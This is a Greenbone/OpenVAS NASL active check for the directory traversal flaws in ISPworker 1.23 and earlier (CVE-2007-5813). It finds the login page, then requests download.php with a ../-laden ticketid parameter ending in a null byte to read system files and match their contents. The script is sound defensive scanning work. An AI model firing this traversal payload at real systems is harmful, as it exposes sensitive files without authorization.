# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100370");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-12-02 17:30:58 +0100 (Wed, 02 Dec 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2007-5813");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ISPworker <= 1.23 Multiple Directory Traversal Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"ISPworker is prone to multiple directory traversal
  vulnerabilities because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting these issues may allow an attacker to obtain
  sensitive information that could aid in further attacks.");

  script_tag(name:"affected", value:"ISPworker versions 1.21 and 1.23. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/26277");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files("linux");

foreach dir (make_list_unique("/ispworker", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/module/biz/index.php";

  res = http_get_cache(port: port, item: url);

  if (!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  if (egrep(pattern: "Login - ISPworker", string: res, icase: TRUE) &&
      egrep(pattern: "start_authentication", string: res, icase: TRUE)) {
    foreach pattern (keys(files)) {
      file = files[pattern];

      url = dir + "/module/ticket/download.php?ticketid=../../../../../../../../../" + file + "%00";

      if (http_vuln_check(port: port, url: url,pattern: pattern)) {
        report = http_report_vuln_url(port: port, url: url);
        security_message(port: port, data: report);
        exit(0);
      }
    }
  }
}

exit(99);
